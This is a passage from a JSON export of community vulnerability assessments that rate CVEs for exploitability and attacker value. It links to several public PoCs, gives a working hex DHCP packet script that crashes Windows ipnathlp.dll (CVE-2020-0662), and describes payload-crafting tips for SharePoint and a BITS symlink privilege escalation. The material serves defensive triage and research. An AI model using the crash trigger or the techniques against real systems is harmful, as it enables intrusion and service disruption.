      "document": "Due to this being an unauthenticated serialization exploit, the bar for exploitation is very low. Serialization is rampant in software, and most companies aren't doing it correctly.\r\n\r\nIt's realtively easy these days to exploit serialization vulnerabilities with ysoserial/yososerial.net and it will be a problem for years going forward.",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6f312f6f-6eaa-4855-a565-097eaaa61c86",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "e85583cb-111d-4d95-80e5-4cd53bb1f952",
      "created": "2020-03-15T12:19:20.586298Z",
      "revisionDate": "2020-06-12T18:36:53.952799Z",
      "document": "This appears to now be exploited in the wild: https://www.us-cert.gov/ncas/current-activity/2020/06/05/unpatched-microsoft-systems-vulnerable-cve-2020-0796\r\n\r\nRCE PoC: https://github.com/chompie1337/SMBGhost_RCE_PoC\r\n\r\nI wanted to note there's a public DoS PoC here: https://github.com/eerykitty/CVE-2020-0796-PoC\r\nAnother one is here: https://gist.github.com/asolino/45095268f0893bcf08bca3ae68a755b2\r\n\r\nHere's the research on RCE as well, which confirms it was challenging to exploit! Hopefully everyone is patched by now: https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html\r\n\r\nAnd another example using maybe a different infoleak (not many details there yet):\r\nhttps://twitter.com/ZecOps/status/1252288104435761154\r\n\r\nAnd, today with everyone Coronavirus sequestered, you're unlikely to inflict any sort of at-scale exploitation if everyone's at home on a host-isolated VPN and literally inaccessible from a mass networking PoV in an office. Hey, maybe working from home _is_ good for security!",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "exploited_in_the_wild",
          "difficult_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "0da3de34-efca-444c-afe5-7d8f68a6bb01",
      "editorId": "83c20f20-be54-4360-8e9b-b2efa22e24f4",
      "topicId": "b021cdc9-578d-4ba9-a4c0-365ab190753f",
      "created": "2020-03-15T19:00:14.657085Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Easy to exploit, although software not common in enterprise, this can lead to dumping of a contact book and adding more contacts which can lead to a SE attack",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "46f87fcf-1248-4dee-b729-044c9dce312c",
      "editorId": "83c20f20-be54-4360-8e9b-b2efa22e24f4",
      "topicId": "e8f30d5f-6ad3-40cf-9f3a-3a8fc548f306",
      "created": "2020-03-15T19:03:48.097098Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Although this can lead to cookie leaks, the typical session cookie expires. And the complexity of this attack requires local access to a system, which, generally you have other ways to get this information.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "difficult_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "c45b8e47-ac0b-4fe2-b3fa-215994ebb991",
      "editorId": "83c20f20-be54-4360-8e9b-b2efa22e24f4",
      "topicId": "b2ebbf0e-24e2-4432-8e53-7e8a540d8917",
      "created": "2020-03-15T19:14:59.087804Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": " In order for this attack to happen a Attacker needs to convince someone to install a ruby gem, which if someone is able to do that they would be able to find a better attack method.",
      "score": 1,
      "metadata": {
        "tags": [
          "requires_interaction"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "c6672afb-c469-44b3-bb7f-4f8fdc571abc",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "f0e4f7b8-0d18-422e-a878-ccf5fb747c2e",
      "created": "2020-03-16T15:52:50.502682Z",
      "revisionDate": "2020-03-16T15:52:50.509955Z",
      "document": "Not enough information to accurately assess ATM. Potential to read config file or access files within git repositories. Odds are some of those repositories have secrets that can be used to pivot further. ",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "0962bfa4-95de-42b8-95c2-64af9daa1cc0",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "fff81f98-d7c3-4efe-8322-ab2a9580b2f1",
      "created": "2020-03-16T15:55:51.262644Z",
      "revisionDate": "2020-06-09T23:22:56.643169Z",
      "document": "Not enough details to fully assess ATM but GitLab is signaling this is a high value vulnerability through: 1) Out of band critical release 2) Withholding details for 30 days (not sure they've ever done so).",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "52b64ca7-9e28-41b9-826e-0c6a6752bac7",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "831ede69-a5dc-468c-807d-144ba7cda373",
      "created": "2020-03-16T16:47:15.522793Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "not a real assessment, just a note: sudoers here is a mess, you can achieve LPE through at least other three GTFOBINS.\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "5c333cae-7491-4dac-9eb3-2979202b591c",
      "editorId": "13aad8d2-5dc7-4a9e-b296-1a6b5255e482",
      "topicId": "c7c0beca-9ed6-4445-a6af-bc9739ce4d65",
      "created": "2020-03-16T19:53:39.026715Z",
      "revisionDate": "2020-04-22T17:57:51.568737Z",
      "document": "I am the author of this exploit. The web application (from 2018) does not list .php7 and .phtml as illegal file extensions. Additionally, the web app has open registration so that anyone with an email can sign up. This allows for virtually anyone to obtain remote code execution on the server by uploading a malicious web shell.\r\n\r\nCurrently on the internet there are 2 live websites running this software.\r\n\r\nPOC is available on my GitHub: https://github.com/cinzinga/CVEs/tree/master/CVE-2020-10557",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "63bfd3e8-ec9a-4c15-b13e-7076583e74af",
      "editorId": "55301196-4e47-4e75-bd5b-d672c3b6c260",
      "topicId": "b2ebbf0e-24e2-4432-8e53-7e8a540d8917",
      "created": "2020-03-17T05:28:21.423301Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is an updated test comment.",
      "score": 1,
      "metadata": {
        "tags": [
          "requires_interaction",
          "difficult_to_exploit",
          "common_enterprise",
          "difficult_to_patch",
          "obscure_configuration",
          "default_configuration"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "a05736cb-7ae0-4cb8-8cb6-01e630e83804",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "0900485a-909b-4258-aeba-8386fba56cf3",
      "created": "2020-03-17T20:31:35.123788Z",
      "revisionDate": "2020-07-16T16:53:27.388248Z",
      "document": "Analysis performed using ipnathlp.dll from Windows Server 2019 x64 (sha256: c5bfdd192eaac8ffa8c0ee9c5fbb719eb739518a0635dc5cba42f52ab7efefa9)\r\n\r\n## Overview\r\nCVE-2020-0662 is a stack based buffer overflow occurring in `svchost.exe` due to an unchecked size argument to a `memcpy` call in `ipnathlp.dll!DhcpAddArpEntry`. The size argument is restricted to 0-255 inclusive as it must fit in a `uint8_t` variable. The size argument for the affected memcpy call is taken from the \"Hardware address length\" field from a DHCP/BootP message.\r\n\r\nIn order to hit the vulnerable code path and trigger the bug, the size (hardware address length) field must be sufficiently large, and the DHCP option 53 / 0x34 (DHCP Message Type) must be omitted.\r\n\r\nThe following [protocon](https://github.com/zeroSteiner/protocon) script can be used to trigger the crash:\r\n\r\n```\r\n# Dynamic Host Configuration Protocol\r\n#     Message type: Boot Request (1)\r\n#     Hardware type: Ethernet (0x01)\r\n#     Hardware address length: 255\r\n#     Hops: 0\r\n#     Transaction ID: 0x5df26992\r\n#     Seconds elapsed: 1\r\n#     Bootp flags: 0x0000 (Unicast)\r\n#     Client IP address: 0.0.0.0\r\n#     Your (client) IP address: 0.0.0.0\r\n#     Next server IP address: 0.0.0.0\r\n#     Relay agent IP address: 0.0.0.0\r\n#     Client MAC address: Vmware_84:05:fd (00:0c:29:84:05:fd)\r\n#     Client hardware address padding: 00000000000000000000\r\n#     Server host name not given\r\n#     Boot file name not given\r\n#     Magic cookie: DHCP\r\n#     Option: (255) End\r\n#         Option End: 255\r\n\r\nset encoding hex\r\nsend 0101ff005df269920001000000000000000000000000000000000000000c298405fd0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000063825363ff\r\nexit\r\n```\r\n\r\nOn a Windows Server 2019 installation, this process is protected by stack cookies making exploitation non-trival. The cookie value would need to be leaked and the service which hosts the DLL is not configured to automatically start. To make a system vulnerable, an interface must be marked as \"Shared\". To do this:\r\n\r\n1. Open the power user menu with `Win+X` and select \"Network Connections\"\r\n1. From the Network Connections window, select \"Change adapter options\"\r\n1. Right click an adapter which has an internet connection and select \"Properties\"\r\n1. Navigate to the \"Sharing\" tab and check \"Allow other network users to connect through this computer's Internet connection\"\r\n1. Click \"OK\"\r\n\r\n## Vulnerable Code Path\r\n\r\n1. `ipnathlp!DhcpProcessMessage`\r\n1. `ipnathlp!DhcpProcessBootpMessage`\r\n    * Only invoked if the DHCP Message Type option is omitted\r\n1. `ipnathlp!DhcpAddArpEntry`\r\n    * Second `memcpy` call is the vulnerability, the size argument is\r\n      under attacker control\r\n\r\n### Crash Notes\r\nThe target process uses stack canaries, so overwriting the stack would\r\nrequire a leak. The original structure is a [MIB_IPNET_ROW2][1]\r\ninstance. Of note here is that the `PhysicalAddressLength` field is\r\nlocated after the `PhysicalAddress` field and is set before the `memcpy`\r\ncall. This could allow an attacker to overwrite the this field.\r\n\r\nImmediately following this operation, the row is passed to\r\n[iphlpapi!CreateIpNetEntry2][2] where the `PhysicalAddressLength` field\r\nis subjected to proper boundary checking (<= 0x20).\r\n\r\n## Windows 7 Notes\r\nWindows 7 does not appear to be a viable exploit target because the affected `memcpy` call is not present due to an older API being used. There is a `memcmp` instruction to which the size parameter can be controlled but this would result in a OOB read which is much less useful.\r\n\r\n[1]: https://docs.microsoft.com/en-us/windows/win32/api/netioapi/ns-netioapi-mib_ipnet_row2\r\n[2]: https://docs.microsoft.com/en-us/windows/win32/api/netioapi/nf-netioapi-createipnetentry2",
      "score": 6,
      "metadata": {
        "tags": [
          "pre_auth",
          "obscure_configuration",
          "common_enterprise",
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "4d723059-179c-4c37-8867-88672ce34967",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "a604c1da-ad86-49f0-b4a4-34ef906b9a49",
      "created": "2020-03-18T19:35:29.513486Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "# Requirements\r\n- openshift/jenkins-slave-base-rhel7-containera (as in Openshift 3.11, 4.2 and 4.3 are now fixed)\r\n- Access to the running container (requires auth)\r\n\r\n# Loot/result\r\nEasy privilege escalation.\r\n\r\n# How to/Details\r\nThe said container modifies the permissions of /etc/passwd so that other users than root can modify it. An attacker can profit from this if they have access to the container.\r\nThe attacker can now make a new user with higher privileges, etc.",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "8a9fa21e-26ce-4a49-8b64-ddb0d8f4b79d",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "6d656548-5996-4a85-82c3-48b6aeb968d3",
      "created": "2020-03-20T12:43:56.601849Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "A crafted .RESX file can be used to execute code when deserialized by .NET reflector. The attacker would need to generate the `.RESX` file, compile it into a `.RESOURCES` file, before combining that with a C# executable to create a malicious binary.\r\n\r\nThe binary would then need to be opened by the target user in .NET reflector and inspected (it looks like by expanding a node within the tree view) in order to cause the resource to be deserialized and the code to be executed. The resulting execution context would be as the user inspecting the file.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "requires_interaction"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "b8baa8cf-d63a-4875-aa17-44105d1607ce",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "f341db63-cb18-4593-bd23-a822694bf635",
      "created": "2020-03-20T13:04:16.704264Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "A .NET deserialization vulnerability exists within Exchange when configured with Unified Messaging (UM). An attacker needs to be able to authenticate as an Exchange user with a configured UM voice mailbox. After doing so they utilize Exchange Web Services (EWS) to upload a malicious payload before calling the target user to leave a voice mail resulting in code execution. The target user does *not* need to listen to the voice mail in order for the payload to be executed.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "7bceb86c-8ddc-417e-8c55-334b9b4b5981",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "2a3f116d-dc02-4bea-b9ad-39f7773274ae",
      "created": "2020-03-20T13:31:36.839846Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "The SharePoint WorkFlow component is affected by a vulnerability within .NET which can be abused to run arbitrary code when compiling XOML files. An authenticated user would need to issue an HTTP request with crafted XOML-formatted data (for which there are public examples). The vulnerability was patched for on-premises installations of SharePoint on January 2020.\r\n\r\nA correct crafted XOML request will result in extra C# code being written to a temporary file on disk as part of the exploitation process. This is how an OS command is then executed.\r\n\r\nBoth patched and unpatched systems will return compiler error information in the XML response to the HTTP request. A patched system will have an error stating `\"Compilation failed. The type name: ... is not a valid language-independent type name.\"`. Malformed requests will include relevant information in the compiler error text, which is usually a character escaping issue. For best results escape all characters that are non-alphanumeric as unicode like `\\u####`.",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "common_enterprise",
          "default_configuration",
          "post_auth"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "15727607-e951-48dd-aa5d-2cfa956cfa5c",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "df071775-cd3a-4643-9e29-3368bd93c00f",
      "created": "2020-03-20T13:46:49.516465Z",
      "revisionDate": "2020-09-02T20:41:19.659425Z",
      "document": "A .NET deserialization vulnerability exists within SharePoint that can be exploited remotely. The vulnerability was actively being exploited in the wild around the May 2019 time frame. Per the [ZDI Advisory](https://www.zerodayinitiative.com/advisories/ZDI-19-181/) the vulnerability is due to a lack of validation on user supplied data to an encoder class which can be leveraged to deserialize attacker-supplied data resulting in remote code execution.\r\n\r\nPer the Microsoft [advisory](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0604):\r\n> Exploitation of this vulnerability requires that a user uploads a specially crafted SharePoint application package to an affected version of SharePoint.\r\n\r\nA [public PoC](https://github.com/k8gege/CVE-2019-0604/blob/master/cve-2019-0604-exp.py) has been released.\r\n\r\nThe initial vulnerability is triggered via an HTTP POST request to `/_layouts/15/Picker.aspx?PickerDialogType=`.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "0464f419-82b1-4ddb-b4e1-53e03adb55e1",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "af37cd6e-8730-4aef-8679-0413b491a107",
      "created": "2020-03-20T16:00:51.262083Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is another of the recent junction-dependent local privilege exploits that rely on tricking a trusted process to move a payload to a trusted location to be executed by a (possibly other) trusted process.  These particular exploits work because many of the trusted binaries fail to evaluate symlinks prior to file moves.  This particular exploit is slightly more difficult, as the timing for it is trickier than some of the other exploits in this style.\r\nThis particular exploit relies on the Background intelligent Transfer Service (BITS), a trusted service used for uploading and downloading files.  BITS is a powerful service that downloads files and can pause, or adjust download speeds based on network state.  To do so, it first downloads files to a temporary location and then moves them to the final location when the download is complete.  In this case, the service impersonates the user who called it when creating the temporary file, but not on the final move.\r\nTo trigger this vulnerability, an attacker must call the BITS service to download a file to a location that represents a symlink to another area of the filesystem.  While BITS is downloading to the temporary location, the attacker must insert a mountpoint and symlink to redirect future file queries for the temporary destination to a malicious file (typically a DLL) and for the final location to redirect to a trusted location (for example C:\\windows\\system32).  BITS will then continue to write tot he original file, but when it completes the task, it performs the final copy not as the user who called it, but as SYSTEM.  That means when the move is called, the attacker has changed the symlink to the temporary file to now point to the malicious file, and the destination directory now redirects to a trusted directory.   When the final move is called, the malicious file is moved to the trusted location as SYSTEM.  It the remains the attacker's task to find something to execute the malicious file.  There are several was to achieve that goal, as multiple trusted processes will blindly load dll files from the system32 directory.  In the PoC I'm looking at now (https://itm4n.github.io/cve-2020-0787-windows-bits-eop/), the overwrite targets WindowsCoreDeviceInfo.dll, which is loaded by the Windows Session Orchestrator service into a system-privileged process, but other options exist.\r\nGiven the race conditions and junctions required, this is not a particularly easy exploit to develop, but PoCs exist, so defenders should be aware of the technique.\r\nBasic mitigations might start with something as simple as checking for any strings shared with James Foreshaw's symbolic link testing tools (https://github.com/googleprojectzero/symboliclink-testing-tools); the advantage being that it would trigger on many of the basic PoCs for this class of vulnerability as they import these libraries during compilation, and leave in the diagnostic strings.  Further mitigations might be to monitor filesystems for the creation of junctions or symlinks to trusted locations.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "difficult_to_patch",
          "difficult_to_develop",
          "post_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
